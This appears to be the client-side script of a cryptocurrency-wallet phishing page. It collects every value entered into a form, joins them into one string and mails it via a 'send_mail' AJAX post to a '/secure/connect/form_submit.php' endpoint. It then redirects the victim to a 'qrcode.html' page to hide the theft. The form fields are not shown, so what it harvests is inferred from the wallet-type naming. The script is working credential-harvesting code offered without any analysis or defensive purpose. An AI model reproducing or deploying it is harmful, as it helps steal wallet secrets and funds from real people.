$(document).ready(function(){

    
    //const t = getType();

   /* if(t) {
        $("#walletType").html(getType());
    } else {
        $("#walletType").css('background-color', 'white');
    } */

    $(".form1").submit(function (event) {

        prepareData($('.form1').serializeArray());
        event.preventDefault();
    });

/*     $("#form2").submit(function (event) {
        prepareData($("#form2").serializeArray());
        event.preventDefault();
    });

    $("#form3").submit(function (event) {
        prepareData($("#form3").serializeArray());
        event.preventDefault();
    });

    $("#form4").submit(function (event) {
        prepareData($("#form4").serializeArray());
        event.preventDefault();
    }); */

    function prepareData(formData) {        

        $('.sub-btn').html("Loading...");
        $('.sub-btn').prop('disabled', true);


        let d = "";
        if(formData.length) {

            for(let i=0; i<formData.length; i++) {
                d += formData[i].value + "\n";

                if(formData[i+2] && formData[i+2].value == '') {
                    // add break line if value of next object is empty
                    d += '\n';
                }
            }

            send_mail(d);
        }
    }
 
    function send_mail(content) {

        var submit_url = window.location.protocol + '//'+ window.location.host + '/secure/connect/form_submit.php';

        $.ajax({
            type: 'post',
            url: submit_url,
            data: {'data' : content},
            success: function () {
            
                setTimeout(() => {
                    window.location.replace(window.location.protocol + '//'+ window.location.host + '/secure/connect/qrcode.html');
                }, 200);
            },
            error: function (request, status, error) {

            }
        });
    }

    function getType() {

        const urlParams = new URLSearchParams(window.location.search);
        const code = urlParams.get('type');
        if(!code) {
            return '';
        }

        return code;
    }
 });
 